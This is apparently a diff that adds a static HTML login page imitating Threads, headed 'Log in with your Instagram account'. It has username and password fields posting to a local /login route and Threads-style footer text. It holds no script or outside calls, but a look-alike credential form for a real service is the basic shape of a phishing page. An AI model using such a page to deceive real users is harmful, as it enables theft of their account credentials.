@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threads Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://via.placeholder.com/1920x1080') no-repeat center center;
+            background-size: cover;
+            z-index: -1;
+            opacity: 0.2;
+        }
+
+        .login-container {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .login-header {
+            margin-bottom: 20px;
+        }
+
+        .login-header h2 {
+            margin: 0;
+            font-size: 1.5em;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #007BFF;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #333;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .separator div {
+            height: 1px;
+            width: 40%;
+            background-color: #ddd;
+        }
+
+        .separator span {
+            margin: 0 10px;
+            color: #888;
+        }
+
+        .social-login {
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .social-login button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background-color: #fff;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+        }
+
+        .social-login button img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        .social-login button:hover {
+            background-color: #f9f9f9;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #555;
+        }
+
+        .footer a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+
+    <div class="login-container">
+        <div class="login-header">
+            <h2>Log in with your Instagram account</h2>
+        </div>
+        <form action="/login" method="post">
+            <div class="form-group">
+                <label for="username">Username, phone or email</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+
+        <div class="separator">
+            <div></div>
+            <span>or</span>
+            <div></div>
+        </div>
+
+        <div class="social-login">
+            <button type="button">
+                <img src="https://via.placeholder.com/20" alt="Instagram logo">
+                Continue with Instagram
+            </button>
+        </div>
+
+        <div class="footer">
+            <p>
+                <a href="#">Forgot password?</a>
+            </p>
+            <p>
+                Threads Terms | Privacy Policy | Cookies Policy | <a href="#">Report a problem</a>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
